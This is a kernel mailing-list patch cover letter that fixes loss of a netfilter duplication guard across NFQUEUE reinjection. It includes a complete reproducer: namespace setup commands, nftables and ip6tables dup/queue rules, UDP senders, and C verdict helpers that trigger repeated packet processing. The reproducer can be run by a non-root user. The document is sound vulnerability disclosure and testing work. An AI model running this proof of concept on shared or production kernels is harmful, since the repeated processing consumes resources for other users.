Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D2D5E5172EB
	for <netfilter-devel@vger.kernel.org>; Fri, 16 Oct 2026 16:16:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792167399; cv=none; b=eV7FhuvzK+Vqi8pVWGvqTe06KIXo/wOTNWj3/Gi5MqZHU9/fbwrE+BsTQT9owD+I98t3Dfz/NhyfEbTDNoEDeCGercbUrXADy9McZOBkGVtJa0mTx5jZDmGA9vxd0K/hb48NA+eYKw1hslzKkFeQM72nlByv4Q+3MApaxJ01JMs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792167399; c=relaxed/simple;
	bh=T3RUaKtdz3r9zD1rxnlKyD6JakR5Mc3MqYoU9BqhFY4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=FlTixycqDVb5c/jhO6RKXlNfZQ5Af/H7K7OXE3wdgosJTqOiy4YHTWnd+RajQxxdGwskDgXqxcNgN+ySA7xfje/L9bUvhySCPazpg2vKZyrsKuURS1eZnW56Fmn2deswxE3jazkBVSeM/2tt1skVnrnboTppSxP6IlP+YRJItWM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=C5NdIo4j; arc=none smtp.client-ip=209.85.210.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="C5NdIo4j"
Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-89e018e466eso77180b3a.0
        for <netfilter-devel@vger.kernel.org>; Fri, 16 Oct 2026 09:16:32 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792167392; x=1792772192; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Mc+X4t4k0rQGinlHuyoaGxxxEKm4Ca8h5Gq5/MrMBGc=;
        b=C5NdIo4jIxxidEhyXEsA1UEIaPx/FOCmJY+9WzguPBjG1ksRqL0ABfEC2sSK/c65AY
         6efKb5yK+GHX83QHHKEX1SqCf6L6WVvmxESbgWuvAXB1LZ+KOxZyx6ZfdY2kifNyaY0l
         3TfEbhdgFUjNHR8NRWZvGMAm+dDwwULEth6jjJlyXKUzGoH6ilNvsb4FDYctJegzlXGG
         sEijpekYOujTSPEdKb6NHmakF6zGQuB2kuzJeAGKF7NLEAXzOvByMS9GyY09llLTYxIj
         uSnipgqFTqv8rgZ70OSWGIdNk/77usj4vrdGFSXuagsYmtuTFphqicI5tcpoFkpp+UIF
         uTaw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792167392; x=1792772192;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Mc+X4t4k0rQGinlHuyoaGxxxEKm4Ca8h5Gq5/MrMBGc=;
        b=uux2dv+b3vRadd5a54KGw5mS5ZbHejNvps33JjQGGyV4BZL4DxJJ6qYAnVQO7P0ViL
         62cyNZztV+OY1NF9jbk5NRMv7p30YQV7zq0aqyAt13tum46e7jABPJGtyrtwJg7zxc4K
         faSyBLb8pezdxLDGJ2PJRHhbLUyzSwr3XV9PIs+wZByhn/Y9Q1c3djOSGfOl0GhJHaUd
         kZdJbCIkJnj7QEaqm3wPIus+GvPpPxngN40cWIoHQx1RsCR396+9FHMLVFk7DXcFFT/W
         +rhbsAWrnvdf1hexAyL985OpMP/d2DxVlwn9KxnHLZM9FbucnzJR0jU+8dcnai4dGmo2
         3O1w==
X-Gm-Message-State: AFq9FYIiZRoTEDoGydOn99tcZIR6IhQ52LLUxaxdgnWSpSioNGkoWZhI
	qXPTUePWV6VIIK3DU/iNyWgYpjfNcHi+YtAhSV1V/vrw70Y3Vpboh4MsMcqJ3mFc/sC01rdBKkm
	ONjVJGjvB
X-Gm-Gg: AYBFou01ZbAveIsA+rYMimZPmjgKGsJ2dKU0BxmpIzxnc/oWDSuP+3p0MJOYN530F9E
	Y2PNA38GWbb64UHBztpMAcOK9tzfFP99O0OfG59ccc5r0BzZYk0Rrxa03rikTZlUaMIzl+6BI5x
	deCM7xdaTJQPaqR0KbekZ1SjI9/B3k08lzJEgZCxRj7Z2gDi1ueunRbxr9CNXFFz7yDYWneCfke
	7A1owCGfLwGMlRRw74RI2eDzYyx2mil5I4IWeuqhaoz3BSTuK6Hjlv5fx/Kw8+9/bDc7apvZIh/
	nGN59qQsFavJUsv9GHqmpwF0sQb+lU47QJlMMvVBjZXXOPAejUF4EVJYSHMI4bkO3CQPnMYyHsU
	nmk+rWkgAAON76t80W34x++zOiSBbrrrLMvPc1rXL+A34mYpll5c/eLDu5Mvx0csAzRBXfYe0F+
	WwaRDChgslm8zYTc+NqgSqRmvVVmla6OQ5f/ciTgR//cucx90BKuO/JrNofh/HltFb2aLzhiPJ2
	/jJcoD/PsOuiAa43Z63RzxGvFSJgQ==
X-Received: by 2002:a05:6a00:4146:b0:87d:430:1437 with SMTP id d2e1a72fcca58-8a04be6035cmr58096b3a.38.1792167391500;
        Fri, 16 Oct 2026 09:16:31 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-89f579464besm1392540b3a.34.2026.10.16.09.16.26
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 16 Oct 2026 09:16:30 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	jengelh@medozas.de,
	vega@nebusec.ai,
	root@tr0jan.top,
	zihanx@nebusec.ai
Subject: [PATCH nf v9 0/1] netfilter: nf_dup: preserve guard across NFQUEUE reinjection
Date: Fri, 16 Oct 2026 16:14:16 +0000
Message-ID: <cover.1792086737.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Save and restore the duplication guard when NFQUEUE resumes hook traversal.

Zihan Xi (1):
  netfilter: nf_dup: preserve guard across NFQUEUE reinjection

 include/net/netfilter/nf_queue.h |  1 +
 net/netfilter/nf_queue.c         |  1 +
 net/netfilter/nfnetlink_queue.c  | 17 ++++++++++++++---
 3 files changed, 16 insertions(+), 3 deletions(-)

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/nfnetlink_queue.c. The bug
is reachable by a non-root user via user and network namespaces.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The IPv4 and IPv6 duplication helpers set current->in_nf_duplicate while a
clone traverses output hooks. If NFQUEUE queues that clone, the output call
returns and clears the task-local guard before a later userspace verdict
resumes hook traversal. The resumed packet can then reach another dup rule
without the guard, causing repeated packet processing and resource
consumption.

This patch records the guard in struct nf_queue_entry and restores it while
nf_reinject() resumes hook traversal. It saves and restores the verdict
task's prior state and keeps bottom halves disabled during reinjection.
The scope of this series is the IPv4/IPv6 NFQUEUE path; netdev duplication
and TTL/hop-limit handling are not changed here.

Changes in v9:
  - narrow the series to the NFQUEUE reinjection guard fix; defer the
    netdev duplication and TTL/hop-limit changes for separate discussion
  - narrow the reinjection warning to mismatched task and queue-entry state
    and test the synchronous fail-open queue path
  - v8 Link:
    https://lore.kernel.org/all/cover.1792048855.git.zihanx@nebusec.ai/

Validation:

The v9 NFQUEUE-only source at
c42d65368f39719fa9540d2c56979f9b537f937b, based on nf.git main at
ab699d296e066eb64f51d2a8a1d42237a3b186c8, built successfully with
CONFIG_DEBUG_NET=y and booted in a 2-vCPU, 2-GiB QEMU guest. The guest
kernel command line included panic_on_warn=1. Tests ran as an unprivileged
user creating fresh user and network namespaces.

The IPv4 nft dup/NFQUEUE test sent three UDP datagrams. The helper reported
callbacks=9, verdict_ok=9, verdict_fail=0; nft counters showed nine visits
at each configured dup rule. The IPv6 xt_TEE/NFQUEUE test sent one UDP
datagram and completed two callbacks with two successful verdicts; the
TEE and NFQUEUE rule counters each showed two packets.

A synchronous fail-open test used queue maxlen 1 and
NFQA_CFG_F_FAIL_OPEN while userspace delayed verdicts. Sending 200 UDP
datagrams produced 600 hits in each configured dup and queue rule. The
helper completed one callback and one successful verdict. While idle
before the tests, the guest logged "clocksource: Watchdog remote CPU 1 read
timed out"; it remained available through the tests. No nf_reinject warning,
BUG, Oops,
or panic occurred during the bounded runs. These were regression and
resource-consumption tests, not crash or OOM tests. They do not establish
the absence of every possible regression.

Reproducer:

NFQUEUE requires a userspace verdict peer, which packetdrill cannot
provide. The following commands run the actual queued-duplication test.

Compile the verdict helper from the poc.c source below, then enter a fresh
user and network namespace:

    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
    runuser -u nobody -- unshare -Urn /bin/bash

Inside the new user/network namespace, create and configure the veth pair:

    ip link add v0 type veth peer name v1
    ip addr add 198.18.0.1/24 dev v0
    ip addr add 198.18.0.2/24 dev v1
    ip link set v0 up
    ip link set v1 up

Then install the following output hooks:

    nft add table ip t
    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
    nft add rule ip t queue1 udp dport 5555 queue num 0
    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0

Start the verdict helper, send three UDP datagrams, and wait for it:

    ./nfq_accept 1 4 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
    wait "$q"

For the IPv6 xt_TEE/NFQUEUE test, use a fresh non-initial user/network
namespace and configure a separate veth pair:

    ip link add v0 type veth peer name v1
    ip -6 addr add fd00::1/64 dev v0
    ip -6 addr add fd00::2/64 dev v1
    ip link set v0 up
    ip link set v1 up

The test fixture pre-created /run/xtables.lock as guest root with mode
0666. The same verdict helper and the following rules and trigger were
used:

    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
    ./nfq_accept 1 6 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
    wait "$q"

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#define NF_ACCEPT 1
#define NF_DROP 0
#define NF_REPEAT 4
#define NF_STOP 5
#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
static const char *mode = "accept";
static struct nfq_q_handle *queue;
static void alarm_handler(int sig) { (void)sig; stop = 1; }
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data)
{
    (void)nfmsg; (void)data;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    if (!ph) return 0;
    uint32_t id = ntohl(ph->packet_id);
    callbacks++;
    if (!strcmp(mode, "slow")) usleep(100000);
    uint32_t verdict = NF_ACCEPT;
    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
    if (rv >= 0) verdict_ok++;
    else verdict_fail++;
    return 0;
}
int main(int argc, char **argv)
{
    int seconds = argc > 1 ? atoi(argv[1]) : 3;
    signal(SIGALRM, alarm_handler); alarm(seconds);
    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
    if (argc > 3) mode = argv[3];
    struct nfq_handle *h = nfq_open();
    if (!h) { perror("nfq_open"); return 1; }
    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
    queue = nfq_create_queue(h, 0, cb, NULL);
    if (!queue) { perror("nfq_create_queue"); return 3; }
    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
    int fd = nfq_fd(h); char buf[65536];
    while (!stop) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
        if (errno == EINTR) continue;
        perror("recv"); break;
    }
    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
    nfq_destroy_queue(queue); nfq_close(h);
    return verdict_fail ? 5 : 0;
}
------END poc.c--------
The fail-open warning check uses a separate delayed-verdict helper and
fixture script. Run it in a fresh user/network namespace, separate from the
namespace used above, so the veth devices and nftables table do not exist
yet. Boot the guest with the kernel command-line option
panic_on_warn=1. Save the two files below in one directory. From that
directory, run:

    runuser -u nobody -- unshare -Urn /bin/bash
    # In the new shell, from the directory containing these files:
    gcc -O2 -o /tmp/nfq_failopen_accept nfq_failopen_accept.c -lnetfilter_queue
    bash nfqueue-failopen-guest.sh

------BEGIN nfq_failopen_accept.c------
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static unsigned long callbacks, verdict_ok, verdict_fail;

static void alarm_handler(int sig)
{
	(void)sig;
	stop = 1;
}

static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
		    struct nfq_data *nfa, void *data)
{
	struct nfqnl_msg_packet_hdr *ph;
	uint32_t id;
	int rv;

	(void)nfmsg;
	(void)data;
	ph = nfq_get_msg_packet_hdr(nfa);
	if (!ph)
		return 0;
	id = ntohl(ph->packet_id);
	callbacks++;
	usleep(200000);
	rv = nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
	if (rv >= 0)
		verdict_ok++;
	else
		verdict_fail++;
	return 0;
}

int main(int argc, char **argv)
{
	struct nfq_handle *h;
	struct nfq_q_handle *qh;
	char buf[65536];
	int seconds = argc > 1 ? atoi(argv[1]) : 3;
	int fd;

	signal(SIGALRM, alarm_handler);
	alarm(seconds);
	h = nfq_open();
	if (!h) {
		perror("nfq_open");
		return 1;
	}
	if (nfq_unbind_pf(h, AF_INET) < 0)
		perror("nfq_unbind_pf");
	if (nfq_bind_pf(h, AF_INET) < 0) {
		perror("nfq_bind_pf");
		return 2;
	}
	qh = nfq_create_queue(h, 0, queue_cb, NULL);
	if (!qh) {
		perror("nfq_create_queue");
		return 3;
	}
	if (nfq_set_queue_maxlen(qh, 1) < 0 ||
	    nfq_set_queue_flags(qh, NFQA_CFG_F_FAIL_OPEN,
				NFQA_CFG_F_FAIL_OPEN) < 0) {
		perror("configure fail-open queue");
		return 4;
	}
	if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
		perror("nfq_set_mode");
		return 5;
	}
	fd = nfq_fd(h);
	while (!stop) {
		int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
		if (n >= 0) {
			nfq_handle_packet(h, buf, n);
			continue;
		}
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			usleep(1000);
			continue;
		}
		if (errno == EINTR)
			continue;
		perror("recv");
		break;
	}
	printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu\n",
	       callbacks, verdict_ok, verdict_fail);
	nfq_destroy_queue(qh);
	nfq_close(h);
	return verdict_fail ? 6 : 0;
}
------END nfq_failopen_accept.c------

------BEGIN nfqueue-failopen-guest.sh------
#!/bin/bash
set -eu

ip link add v0 type veth peer name v1
ip addr add 198.18.0.1/24 dev v0
ip addr add 198.18.0.2/24 dev v1
ip link set v0 up
ip link set v1 up

nft add table ip failopen_test
nft 'add chain ip failopen_test dup1 { type filter hook output priority raw; policy accept; }'
nft 'add chain ip failopen_test queue1 { type filter hook output priority mangle; policy accept; }'
nft 'add chain ip failopen_test dup2 { type filter hook output priority filter; policy accept; }'
nft add rule ip failopen_test dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
nft add rule ip failopen_test queue1 udp dport 5555 counter queue num 0
nft add rule ip failopen_test dup2 udp dport 5555 counter dup to 198.18.0.2 device v0

/tmp/nfq_failopen_accept 10 >/tmp/nfq-failopen.out 2>&1 &
queue_pid=$!
sleep 0.2
python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(200)]'
wait "$queue_pid"
cat /tmp/nfq-failopen.out
nft -a list table ip failopen_test
------END nfqueue-failopen-guest.sh------


Best regards,
Zihan Xi

-- 
2.43.0
